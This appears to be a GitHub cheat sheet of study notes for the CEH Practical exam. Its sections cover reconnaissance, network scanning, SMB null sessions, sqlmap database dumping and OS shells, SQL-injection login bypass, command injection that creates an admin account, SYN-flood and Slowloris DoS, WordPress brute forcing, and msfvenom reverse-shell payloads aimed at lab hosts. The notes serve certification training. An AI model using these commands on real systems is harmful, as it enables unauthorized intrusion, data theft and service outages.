# Important resources
[Resources](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/5-System-Hacking/10-Covert_TCP.md):


## 2)Footprinting and Reconnaissance
<details>
    <summary> Reconnasiance/Footprinting</summary>
<details>
    <summary> 1) Windows CLI tools </summary>

```bash
$ ping <ip>
 or 
$ ping www.domain.com
```
````console
$ ping <host-ip> -f -l 1300
````
```bash
$ nslookup <domain.com>
```
```bash
$ tracert <doamin>

$ traceroute <host-ip>
```
</details>


### 2)Edit,Debug and monitor
<details>
    <summary> 2)Firebug </summary>
    
- Firebug extension Integrated with Firefox
  
</details>

### 3)Mirroring website:
<details>
    <summary> Mirroring</summary>
    
- Windows: HTTrack

- Linux: wget
```bash
 $ wget <url-of-website>
``` 
#### Note:- check wget -h for options

</details>

### 4)Advance route tracing 
#### Tool: Path Analyzer Pro

<details>
    <summary> 5)Information Gathering Using Metasploit</summary>

#### Extract accurate information about a network using Metasploit Framework.

```bash
$ service postgresql start
```
```bash
In msf type 
$db_status
```
If error then exit and type below commands
- To initialize database
```
$ msfdb init
```
```
$ service postgresql start
```
relaunch metasploit Framework
```
$ msfconsole
$ db_status
$ nmap -Pn -sS -A -oX <output_file> <subnet(xx.xx.xx.x/24)>
```
you can use different options and also remove some options
```
$ hosts
```
to get host information

```
$ use auxilliary/scanner/smb/smb_version
or 
$ use /scanner/smb/smb_version
$ show options
$ set RHOSTS xx.xx.xx.8-16
$ set THREADS 1000
$ run 
```
- Now you can see the os_flavor 
- Hence Extracted information about network using metasploit
</details>
</details>

## 3)Scanning Networks
<details>
    <summary>Scanning Networks</summary
- Port Scanning using Hping3:

```bash
hping3 --scan 1-3000 -S 10.10.10.10
```
--scan parameter defines the port range to scan and –S represents SYN flag.

- Pinging the target using HPing3:
```
hping3 -c 3 10.10.10.10
```
-c 3 means that we only want to send three packets to the target machine.

- UDP Packet Crafting
```
hping3 10.10.10.10 --udp --rand-source --data 500
```
- TCP SYN request
```
hping3 -S 10.10.10.10 -p 80 -c 5
```
-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.

- HPing flood
```
hping3 10.10.10.10 --flood
``` 

-  ### Tools:
![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/248179ca-8bb3-4bf4-ba33-c6520e0054df)

</details>


## 4)Enumeration
<details>
    <summary>Enumeration</summary>

###  1) NetBios Enumeration
#### Tool: Global Network Inventory
- Audit Scan Mode >> Select IP range >> Authentication setting >> connect as windows 12(victim) server using credentials that is currently logged on
- The Scan Summary tab displays a brief summary of machine that has been scanned. It will shows you the Machine name, MAC Address, OS installed, and etc.
- User groups,Services,Installed Softwares etc can be seen in the scan summmary.
  
### 2) Network Resources
#### Tool: Advanced IP Scanner  
- Enumerate network resources using Advanced IP Scanner.
- Perform a system ard network scan, Enumerate user accounts, Execute remotepenetration, Gather information about local network
- Input range of IP
- Now you have the IP address, Name, MAC address, and Manufacturer information of the victim machine.

### 3) Network enum using superscan
#### Tool: Superscan
- Lists of computers that belong to a domain
- Lists Of shares on the individual hosts on the network
- Policies and passwords
- Enter hostname/IP/URL >> select Enumeration type >> and see the scan result for required information.

### 4) Resurces in Local machine
#### Tool: Hyena
- Click '+' node of local workstation to expand section.
- select different nodes to view their information
- Users, Services, User Rights, Scheduled jobs

### 5) SMB ENumeration
#### Tools: nbstat,nmap

- In windows 12
```bash
nmap -O <win-12-ip>
```

```bash
nbstat -A xx.xx.xx.xx  //perform nbstat scan on port 139 in cmd
net use
net use \\xx.xx.xx.xx\e ""\user:""
net use \\xx.xx.xx.16\e""/user:""  //create null session 
// xx.xx.xx.16 is windows server 16
```
- disconnect drive Z
-this creates a null session 
- confirm by using
```bash
net use // session with name e would have been created
```


##### Note: Your first target is the computer with a Windows OS on which you can see ports 139 and 445 open. Remember, this usually works only against Windows but may partially succeed if other OSs have these ports open. There may be more than one system with NetBIOS open. You see that ports 135. 139.445. etc. are open and port 139 is using NetBIOS.

  ### 6) Some other tools
#### Tools:
- NetBIOS Enumerator
- SoftPerfect Network Scanner

</details>

## 5) Vulberability Analysis
<details>
    <summary>Vulnerability Analysis</summary>

- ### Nessus Vulnerability Scanner

- ### Nikto

```bash
nikto -h url -Cgidirs all
```
</details>

## 17) Android Hacking
<details>
    <summary>Android Hacking</summary>

    
### ADB
```bash
netdiscover -r xx.xx.xx.xx/24
nmap -O xx.xx.xx.4
apt-get update
apt-get install adb -y
```

- Use
```bash
adb devices -l
adb connect xx.xx.xx.4:5555 //5555 is port of android discovered in 'nmap -O' scan
adb shell // 'To get shell access'
```
- You can run commands like

```bash
pwd
cd
ls
echo
```

#### Download a File from Android using ADB tool
```bash
adb pull /sdcard/log.txt C:
adb pull sdcard/log. txt /home/murphy/Desktop
```

### Phonesploit
- Refer README.md
  
</details>

## 15) SQL Injection

<details>
    <summary>SQL Injection</summary>
    
- ### SQLMAP Extract DBS
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
```
- ### Extract Tables
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
```
- ### Extract Columns
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
```
- ### Dump Data
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
```
- ### OS Shell to execute commands
```bash
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
```
- ### Login bypass
```bash
blah' or 1=1 --
Insert data into DB from login
blah';insert into login values ('john','apple123');
Create database from login
blah';create database mydatabase;
Execute cmd from login
blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- 
```
</details>

## Malware Threats
<details>
    <summary>Malware Threats </summary>
![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/66f39b98-d3e1-4070-ae52-ef89fb2c6183)

 ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/69d2c29b-24b6-451c-8f49-d2aa832b9855)
 ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/d6015e48-a7cd-4370-994f-f56cce36f07e)
 ![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/7a2cfc60-85a8-477d-9a31-1fc31bfcf94e)
 
</details>


## 8) Sniffing
<details>
    <summary> Wireshark</summary>
      - Some useful wireshark command 
```
filter : http
option --> find packet->> select string --> pwd  // to find pwd string in packets
```
=======================================================================================================================================================================
- Sets a filter for any packet that has x.x.x.x as the source or destination IP address. This is very useful if, let’s say, you want to analyze specific traffic. Applying this filter helps you analyze outgoing traffic to see which one matches the IP or source you’re looking for.
```
ip.addr == x.x.x.x
``` 
 
- You can also choose to use ``` ip.dst == x.x.x.x```  to filter only by destination or ``` ip.src == x.x.x.x ``` to filter by source.
 
- Sets a conversation filter between two specific IP addresses. This one helps you check the data between two specific hosts or networks. It helps you when you are looking for specific data, so you don’t have to go through others that don’t interest you. 
 ```
ip.addr == x.x.x.x && ip.addr == x.x.x.x 

(or ip.src == xxxx && ip.dst == xxxx - for a destination)
``` 

Sets a filter to display all http and dns protocols. It lets you narrow down to the exact protocol you need. So, if you need to track down an odd FTP traffic, then you just have to set it for ‘ftp’. Want to find out why some websites don’t appear? You just have to set it to ‘dns’.
```
http or dns
```


tcp.port==xxx

Sets filters for any TCP packet with a specific source or destination port. Sometimes is just useful and less time consuming to look only at the traffic that goes into or out of a specific port.

 
- Sets filters to display all TCP resets. All packets have a TCP, if this is set to 1, it tells the receiving computer that it should at once stop using that connection. So, this filter is a powerful one, being that a TCP reset kills a TCP connection immediately.
- 
tcp.flags.reset==1



 

tcp contains xxx

It’s a filter that displays all TCP packets that contain a certain term (instead of xxx, use what term you’re looking for). For example, if you are looking for a specific term appearing in the packet, this filter is what you need.

 
- Follows a tcp stream.
```
tcp.stream eq X
```

- Filters by sequence number.
```
tcp.seq == x
```
 
- Important for troubleshooting, this filter detects push events.
``` 
tcp.flags.push == 1
```

- This one filters all HTTP GET and POST requests. It can show the most accessed webpages.
````
 http.request
 ````

- Designed to filter out certain types of protocols, it masks out arp, icmp, dns, or other protocols you think are not useful. This will allow you to focus of what traffic interests you.
```
 !(arp or icmp or dns)
 ```

- It sets a filter for certain HEX values at any offset.
```
udp contains xx:xx:xx
```


 
- Indicates which dns requests couldn't be correctly resolved.
 ```
dns.flags.rcode != 0
 ```

</details>

</details>


## 9)Social Engineering
<details>
    <summary>Social</summary>

### Tool: Social Engineering Toolkit(linux)

</details>

## 10)DOS

<details>
    <summary>DoS</summary>
    
- Spoof IP
- SYN Flooding
    
```
use auxiliary/dos/tcp/synflood
show options
SYN flooding on port 4444
set timeout 20000 //rest as shown in option
```
   
</details>

## 11)Session Hijacking
<details>
    <summary>Session Hijacking</summary>


</details>

## 14)Web Application Hacking
<details>
    <summary> Web Hacking</summary>
    
### 1) Parameter Tampering
    - Changing ?id=1 or 2 or 3 to switch user.
### 2) XSS
      - In cotactact us page i the commrent section post the following script `<script>alert("You are Hacked")</script>`

### 3) WPScan
- SkipFish : Active Recon for Websites 
  
```console
skipfish -o 202 http://192.168.1.202/wordpress
```

- Wordpress Site Login BruteForce [Step-By-Step](https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/)
  
```shell
# Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u 

# Direct crack if we have user/password details

wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Using Metaspoilt
msfdb init && msfconsole
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file user.txt
msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
msf auxiliary(wordpress_login_enum) > exploit
    
```
### 4) RCE
- In DVWA application to ping.
```bash
| hostname  //name of target machine
| whoami   // user,groups,privileges
| tasklist  //lists running process
| dir C:\
| net user
| net user Test /Add
| net user 
| net user Test //displays info about user Test
| net localgroup Administrators Test /Add
| net user Test //now it's in Administrator

```
- To launch Remote Desktop Connection, navigate to ```Start--> Windows Accessories--> Remote Desktop Connection```

### 5)Web Application Framework
<details>
<summary> Auditing </summary>

#### Tools: Vega(Linux)
- Enter URL --> select Injection and Response modules --> click yes --> check Scan summary


###  WVS 
#### Tool: Acunetics WVS

</details>

### 6) File Upload Vulnerbility
-  ``` msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw ```  
- This command will generate a php raw payload.
- copy the payload and make a .php file
-  ```msfconsole``` . Now you have to establish a meterpreter session with your victim
```
Type use multi/handler and hit Enter.
Type set payload
php/meterpreter/reverse_tcp and hit
Enter.
Type set lhost 10.10.10.11 and hit Enter.
set Iport 4444
and hit Enter.
- vist the uri where the file is to execute on web browser
```
</details>



## 18)IOT Hacking
<details>
    <summary>IOT</summary>
    
### Tools:
- Shodan.io

- CRITIFENCE
```
 CRITIFENCE is an online database that stores default passwords of critical infrastructure, SCADA, [CS, and 110T Attackers can use this tool to discover
the default credentials of an OT system It lists information such as product code, vendor, device type and its default username and password
  ```
- Nmap
![image](https://github.com/Priansh71/CEH-Practical/assets/90593472/dbe2d60e-4af9-4376-b4ed-baa7e21dee5d) // nmap different types of scans.

- Scada
    - SCADA Shutdown Tool is an ICS testing and automation tool that allows attackers to fuzz, scan, and run remote commands on ICS/SCADA networks and controllers
    - Attackers use this tool to examine and enumerate slave controllers and SCADA security systems as well as read register values of the controller and rewrite register data.
      
- #### Other Tools
      - Nessus
      - wireshark
</details>

## 19)Cloud Computing
<details>
    <summary>Bypassing Antivirus</summary>

```
In the terminal type: 
msfvenom -p linux/x86/shell/reverse_tcp LHOST=IO.IO.IO.11  LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf  
//  -f elf shows the type of payload file we want to create
This will generate exploit.elf on Desktop
```
- upload it it share folder 
- capture request in msfconsole:
```
 use multi/handler
set payload linux/x86/reverse_tcp 
LHOST = xx.xx.xx.xx
LPORT = 4444
```

</details>


<details>
    <summary>DoS using Slowloris</summary>
 
- Capture request using wireshark
- In Terminal
    
```
cd /Desktop/Slowloris
ls  // slowloris.pl
./Slowloris.pl -dns xx.xx.xx.xx
Hence the Dos attack was executed.

```
</details>
    
## 20)Cryptography    
<details>
    <summary>Cryptography</summary>
</details>

## Host DIscovery
<details>
    <summary>Hsot Discover</summary>
```
ARP Ping Scan:           nmap -sn -PR <Target IP Address>    ARP request probe
UDP Ping Scan:           nmap -sn -PU <Target IP Address>    UDP request
ICMP ECHO Ping Scan:     nmap -sn -PE <Target IP Address>    ICMP LCBO request

</details>

#  LLMNR/NBT-NS Poisoning
<details>
<summary> LLMNR/NBT</summary>
  
- [Reference Guide](https://certmaster.me/a-detailed-guide-on-responder-llmnr-poisoning-22f3a07b9786?gi=809a695ee049):

  </details>
